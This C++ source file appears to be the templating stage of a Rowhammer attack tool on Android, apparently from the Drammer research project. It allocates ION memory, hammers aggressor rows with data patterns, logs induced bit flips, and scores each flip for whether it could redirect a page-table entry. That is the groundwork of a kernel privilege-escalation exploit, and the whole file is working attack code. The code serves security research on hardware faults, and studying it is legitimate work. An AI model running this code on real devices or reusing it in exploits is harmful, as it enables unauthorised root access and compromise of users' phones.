/*
 * Copyright 2016, Victor van der Veen
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */


#include <assert.h>
#include <stdlib.h>

#include "ion.h"
#include "rowsize.h"
#include "templating.h"

extern int rowsize;

#define PAGES_PER_ROW (rowsize / PAGESIZE)

#define FLIP_DIRECTION_STR(x) (((x) == ONE_TO_ZERO) ? "1-to-0" : "0-to-1")

//#define DEBUG

#ifdef DEBUG
#define dprintf(...) printf(__VA_ARGS__)
#else
#define dprintf(...) do {} while (0)
#endif


int spc_flips = 0;

bool is_exploitable(struct template_t *tmpl) {
    int rows_per_chunk = tmpl->ion_len / rowsize;

    dprintf("- bits flipped       : %6d\n", tmpl->bits_set);
    if (tmpl->bits_set != 1) {
        dprintf("[ :( ] We support only single flips\n");
        return false;
    }

    dprintf("- index in page table: %6d\n", tmpl->word_index_in_pt);
    if (tmpl->word_index_in_pt < 0) {
        dprintf("[ :( ] Flip will never fall in hardware page table\n");
        return false;
    } 

    dprintf("- index in word      : %6d\n", tmpl->bit_index_in_word);
    if (tmpl->bit_index_in_word < 12) {
        dprintf("[ :( ] Flip is in properties of PTE\n");
        return false;
    }

    
    dprintf("- flip direction     : %s\n", FLIP_DIRECTION_STR(tmpl->direction));
   
    dprintf("- relative target pfn: %6d (row: %6d, idx: %2d, 16k: %6d)\n", tmpl->target_pfn, tmpl->target_pfn_row, tmpl->target_page_index_in_row, tmpl->target_16k_pfn);
    dprintf("- relative source pfn: %6d (row: %6d, idx: %2d, 16k: %6d)\n", tmpl->source_pfn, tmpl->source_pfn_row, tmpl->source_page_index_in_row, tmpl->source_16k_pfn);
    if (tmpl->source_pfn_row < 0 || tmpl->source_pfn_row >= rows_per_chunk) {
        dprintf("[ :( ] Flip offset requires illegal source pfn\n");
        return false;
    }

    if (tmpl->direction == ZERO_TO_ONE) {
        /* A 0-to-1 flip in the PTE acts as an addition. If the new PFN (the
         * page table) is in the same row as the old PFN (the mapped ION data chunk), 
         * it should be (1) ahead of the old one, and (2) fall in a different
         * 'minimum ION chunk boundary' (dictated by what ION allocations go
         * through slab, usually < 16K). */
        if (tmpl->source_pfn_row == tmpl->target_pfn_row) {
            if (tmpl->source_16k_pfn >= tmpl->target_16k_pfn) {
                dprintf("[ :( ] Target 16k pfn not after source 16k pfn\n");
                return false;
            } 
        } else if (tmpl->source_pfn_row > tmpl->target_pfn_row) {
            dprintf("[ :( ] Target row not after source row\n");
            return false;
        } 
    } else {
        /* A 1-to-0 flip in the PTE acts as an addition, so it's all backwards
         * now */
        if (tmpl->source_pfn_row == tmpl->target_pfn_row) {
            if (tmpl->source_16k_pfn <= tmpl->target_16k_pfn) {
                dprintf("[ :( ] Target 16k pfn not before source 16k pfn\n");
                return false;
            }
        } else if (tmpl->source_pfn_row < tmpl->target_pfn_row) {
            dprintf("[ :( ] Target row not before source row\n");
            return false;
        } 
    }

    dprintf("[ :) ] FLIP MIGHT BE EXPLOITABLE!\n");
    return true;
}

bool template_exists(std::vector<struct template_t *> &templates, 
                     uintptr_t virt, uint32_t org_byte, uint32_t new_byte) {
    for (auto tmpl : templates) {
        if (tmpl->virt_addr == virt && 
            tmpl->org_byte == org_byte &&
            tmpl->new_byte == new_byte) return true;
    }
    return false;
}   
           

void handle_flip(uint8_t *virt_row, 
                 uintptr_t *virt_above, 
                 uintptr_t *virt_below, 
                 uint8_t *pattern, 
        std::vector<struct template_t *> &templates, int index_in_row, struct ion_data *chunk) {

    struct template_t *tmpl = (struct template_t *) malloc(sizeof(struct template_t)); 

    tmpl->virt_row   = (uintptr_t) virt_row;
    tmpl->virt_addr  = (uintptr_t) virt_row + index_in_row;
    tmpl->phys_addr  = (uintptr_t) get_phys_addr(tmpl->virt_addr);
    tmpl->virt_page  = (uintptr_t) (tmpl->virt_addr / PAGESIZE) * PAGESIZE;
    tmpl->virt_above = (uintptr_t) virt_above;
    tmpl->virt_below = (uintptr_t) virt_below;
    
    tmpl->org_byte   = (uint8_t)  pattern[index_in_row];
    tmpl->new_byte   = (uint8_t) virt_row[index_in_row];
    tmpl->org_word   = (uint32_t) ((uint32_t *) pattern)[index_in_row / 4];
    tmpl->new_word   = (uint32_t) ((uint32_t *)virt_row)[index_in_row / 4];
    tmpl->xorred_byte = tmpl->org_byte ^ tmpl->new_byte;
    tmpl->xorred_word = tmpl->org_word ^ tmpl->new_word;
    tmpl->bits_set    = __builtin_popcount(tmpl->xorred_word);

    tmpl->byte_index_in_row  = index_in_row;
    tmpl->byte_index_in_page = index_in_row % PAGESIZE;
    tmpl->word_index_in_page = tmpl->byte_index_in_page / 4;
    tmpl->word_index_in_pt   = tmpl->word_index_in_page - 512;
    tmpl->bit_index_in_word  = ffs(tmpl->xorred_word) - 1;

    tmpl->org_bit   = (tmpl->org_word & tmpl->xorred_word) >> tmpl->bit_index_in_word;
    tmpl->direction = tmpl->org_bit ? ONE_TO_ZERO : ZERO_TO_ONE;

    tmpl->ion_chunk = chunk;
    tmpl->ion_len   = chunk->len;

    tmpl->rel_address   = (uintptr_t) tmpl->virt_addr - (uintptr_t) tmpl->ion_chunk->mapping;
    tmpl->rel_row_index = tmpl->rel_address / rowsize;
    tmpl->rel_pfn       = tmpl->rel_address / PAGESIZE;

    tmpl->target_pfn     = tmpl->rel_pfn;
    tmpl->source_pfn     = tmpl->target_pfn ^ (1 << (tmpl->bit_index_in_word - 12));
    tmpl->target_pfn_row = tmpl->target_pfn / PAGES_PER_ROW;
    tmpl->source_pfn_row = tmpl->source_pfn / PAGES_PER_ROW;
    tmpl->target_pte     = tmpl->target_pfn << 12;
    tmpl->source_pte     = tmpl->source_pfn << 12;
    tmpl->target_page_index_in_row = tmpl->target_pfn - (tmpl->target_pfn_row * PAGES_PER_ROW);
    tmpl->source_page_index_in_row = tmpl->source_pfn - (tmpl->source_pfn_row * PAGES_PER_ROW);

    tmpl->target_16k_pfn = tmpl->target_pfn / 4;
    tmpl->source_16k_pfn = tmpl->source_pfn / 4;
    tmpl->found_at = time(NULL);
    
    
    print("[FLIP] i:%p l:%d v:%p p:%p b:%5d 0x%08x != 0x%08x s:%d", 
                     tmpl->ion_chunk->mapping, 
                     tmpl->ion_len,
            (void *) tmpl->virt_addr, 
            (void *) tmpl->phys_addr, 
                     tmpl->byte_index_in_row,
                     tmpl->org_word, 
                     tmpl->new_word,
                     tmpl->found_at);
    printf("\n");
   
    tmpl->maybe_exploitable = is_exploitable(tmpl);
    if (global_of) {
        if (tmpl->maybe_exploitable) fprintf(global_of, "!\n");
        else fprintf(global_of,"\n");
    }
    
    templates.push_back(tmpl);
    

}
    
int get_exploitable_flip_count(std::vector<struct template_t *> &templates) {
    int count = 0;
    for (auto tmpl : templates) {
        if (tmpl->maybe_exploitable) count++;
    }
    return count;
}
int get_direction_flip_count(std::vector<struct template_t *> &templates, int direction) {
    int count = 0;
    for (auto tmpl : templates) {
        if (tmpl->direction == direction) count++;
    }
    return count;
}
struct template_t * get_first_exploitable_flip(std::vector<struct template_t *> &templates) {
    for (auto tmpl : templates) {
        if (tmpl->maybe_exploitable) return tmpl;
    }
    return NULL;
}

int find_flips_in_row(std::vector<struct template_t *> &templates, uintptr_t phys1) {
    int flips = 0;
    for (auto tmpl : templates) {
        if (tmpl->phys_addr >= phys1 && tmpl->phys_addr < (phys1 + rowsize)) flips++;
    }
    return flips;
}

int do_hammer(uint8_t *virt_row,
     volatile uintptr_t *virt_above,
     volatile uintptr_t *virt_below,
              uint8_t *pattern_above, 
              uint8_t *pattern, 
              uint8_t *pattern_below,
              std::vector<struct template_t *> &templates, struct ion_data *chunk,
              int hammer_readcount) {

    int new_flips = 0;

    /* write pattern to victim row */
    memcpy(virt_row, pattern, rowsize);
  
    /* hammer */
    uint64_t t1 = get_ns();
    for (int i = 0; i < hammer_readcount; i++) {
        *virt_above;
        *virt_below;
    }
    uint64_t t2 = get_ns();
    int ns_per_read = (t2 - t1) / (hammer_readcount * 2);
            
    uint8_t *row_above = (uint8_t *) ((uintptr_t) virt_row - rowsize);
    uint8_t *row_below = (uint8_t *) ((uintptr_t) virt_row + rowsize);

    /* compare bytes of the victim row again the original pattern */
    for (int i = 0; i < rowsize; i++) {
        if (virt_row[i] != pattern[i] ) {
            if (template_exists(templates, (uintptr_t) virt_row + i, pattern[i], virt_row[i])) continue;

            new_flips++;
            if (new_flips == 1) printf("\n");

            handle_flip(virt_row, 
                        (uintptr_t *) virt_above, 
                        (uintptr_t *) virt_below, 
                        pattern, templates, i, chunk);
        }

        if (row_above[i] != pattern_above[i] ) {
            spc_flips++;
            new_flips++;
            if (new_flips == 1) printf("\n");
            print("[SPECIAL FLIP] v:%p 0x%08x != 0x%08x\n", (uintptr_t) virt_above + i, virt_above[i], pattern_above[i]);
        }
        if (row_below[i] != pattern_below[i]) {
            spc_flips++;
            new_flips++;
            if (new_flips == 1) printf("\n");
            print("[SPECIAL FLIP] v:%p 0x%08x != 0x%08x\n", (uintptr_t) virt_below + i, virt_below[i], pattern_below[i]);
        }
    }
    if (new_flips > 0)  
        printf("[TMPL - deltas] virtual row %d: ", (uintptr_t) virt_row / rowsize);

    return ns_per_read;
}

bool times_up;
void alarm_handler(int signal) {
    printf("\n[TIME] is up, wrapping up\n");
    times_up = true;
}

/* Perform 'conservative' rowhammer: we hammer each page in a row. The figure
 * below - row size of 32K = 8 pages - illustrates a victim row (pages P1 .. P8) 
 * and its two aggressor rows (above, pages A1 .. A8, and below, pages B1 ..
 * B8). We write patterns to the entire rows (using <*_row>) and then
 * hammer pages by reading from <virt_above> and <virt_below>. 
 * 
 * /-- <above_row>
 * |              /-- <virt_above>
 * |    ----------+------------------------------
 * \--->| A1 | A2 | A3 | A4 | A5 | A6 | A7 | A8 |
 *      -----------------------------------------
 * /--->| P1 | P2 | P3 | P4 | P5 | P6 | P7 | P8 |<-- victim row
 * |    -----------------------------------------
 * | /->| B1 | B2 | B3 | B4 | B5 | B6 | B7 | B8 |
 * | |  ----------+------------------------------
 * | |            \-- <virt_below>
 * | \-- <below_row>       
 * \-- <virt_row>
 */
void TMPL_run(std::vector<struct ion_data *> &chunks, 
              std::vector<struct template_t *> &templates, 
              std::vector<struct pattern_t *> &patterns, int timer, int hammer_readcount,
              bool do_conservative) {
    
    int bytes_hammered = 0;
    std::vector<uint64_t> readtimes;

    if (timer) {
        printf("[TMPL] Setting alarm in %d seconds\n",  timer);
        signal(SIGALRM, alarm_handler);
        alarm(timer);
    }
    times_up = false;

    int bytes_allocated = 0;
    for (auto chunk : chunks) {
        bytes_allocated += chunk->len;
    }
    
    time_t start_time = time(NULL);
    print("[TMPL] - Bytes allocated: %d (%d MB)\n", bytes_allocated, bytes_allocated / 1024 / 1024);
    print("[TMPL] - Time: %d\n", start_time);
    print("[TMPL] - Start templating\n");
    for (auto chunk : chunks) {
        ION_get_hammerable_rows(chunk);
   
        for (auto virt_row : chunk->hammerable_rows) {
            uintptr_t phys_row = get_phys_addr(virt_row);
            int virt_row_index = virt_row / rowsize;
            int phys_row_index = phys_row / rowsize;

            int median_readtime = compute_median(readtimes);
            int seconds_passed = time(NULL) - start_time;
            int flips = templates.size();
            int exploitable_flips = get_exploitable_flip_count(templates);
            double kb_per_flip, percentage_exploitable;
            int to0, to1;
            if (flips > 0) {
                kb_per_flip = (bytes_hammered / 1024) / (double)  flips;
                percentage_exploitable = (double) exploitable_flips / (double) flips * 100.0;
                to0 = get_direction_flip_count(templates, ONE_TO_ZERO);
                to1 = get_direction_flip_count(templates, ZERO_TO_ONE);
            } else {
                kb_per_flip = 0.0;
                percentage_exploitable = 0.0;
                to0 = 0;
                to1 = 0;
            }

            print("[TMPL - status] flips: %d | expl: %d | hammered: %d | runtime: %d | median: %d | kb_per_flip: %5.2f | perc_expl: %5.2f | special: %d | 0-to-1: %d | 1-to-0: %d\n", 
                    flips, exploitable_flips, bytes_hammered, seconds_passed, median_readtime, kb_per_flip, percentage_exploitable, spc_flips, to1, to0);
            print("[TMPL - hammer] virtual row %d: %p | physical row %d: %p\n", 
                    virt_row_index, virt_row, phys_row_index, phys_row);
            printf("[TMPL - deltas] virtual row %d: ", (uintptr_t) virt_row_index);

        
            uintptr_t above_row = virt_row - rowsize;
            uintptr_t below_row = virt_row + rowsize;

            int step = PAGESIZE;
            if (do_conservative) 
                step = 64;

            for (int offset = 0; offset < rowsize; offset += step) {
                uintptr_t virt_above = above_row + offset;
                uintptr_t virt_below = below_row + offset;

                printf("|");
                for (auto pattern: patterns) {

                    /* write patterns to the adjacent rows and hammer */
                    memcpy((void *) above_row, pattern->above, rowsize);
                    memcpy((void *) below_row, pattern->below, rowsize);
                    int delta = do_hammer(         (uint8_t   *) virt_row, 
                                          (volatile uintptr_t *) virt_above,
                                          (volatile uintptr_t *) virt_below, 
                                          pattern->above, pattern->victim, pattern->below, templates, chunk, hammer_readcount);
                    readtimes.push_back(delta);
                    printf("%d|", delta);

                    pattern->cur_use++;
                    if (pattern->max_use && pattern->cur_use >= pattern->max_use) {
                        if (pattern->reset_above)  pattern->reset_above (pattern->above);
                        if (pattern->reset_victim) pattern->reset_victim(pattern->victim);
                        if (pattern->reset_below)  pattern->reset_below (pattern->below);
                        pattern->cur_use = 0;
                    }
                }
                printf(" ");
       
                bytes_hammered += step;

                if (times_up) break;
            }
            printf("\n");
                
            if (times_up) break;
        }

        if (times_up) break;

        /* clean */
        ION_clean(chunk);
    }

    int median_readtime = compute_median(readtimes);

    printf("\n[TMPL] Done templating\n");
    int flips = templates.size();
    print("[TMPL] - bytes hammered: %d (%d MB)\n", bytes_hammered, bytes_hammered / 1024 / 1024);
    print("[TMPL] - median readtime: %d\n", median_readtime);
    print("[TMPL] - unique flips: %d (1-to-0: %d / 0-to-1: %d)\n", flips,
            get_direction_flip_count(templates, ONE_TO_ZERO),
            get_direction_flip_count(templates, ZERO_TO_ONE));

    if (flips > 0) {
        double kb_per_flip = (bytes_hammered / 1024) / (double)  flips;
        printf("[TMPL] - kb per flip: %5.2f\n", kb_per_flip);
    }
    int exploitable_flips = get_exploitable_flip_count(templates);
    print("[TMPL] - exploitable flips: %d\n", exploitable_flips);
    if (exploitable_flips > 0) {
        print("[TMPL] - first exploitable flip found after: %d seconds\n", get_first_exploitable_flip(templates)->found_at - start_time);

        double percentage_exploitable = (double) exploitable_flips / (double) flips * 100.0;
        printf("[TMPL] - percentage of flips that are exploitable: %5.2f\n", percentage_exploitable);
    }
    print("[TMPL] - time spent: %d seconds\n", time(NULL) - start_time);
}

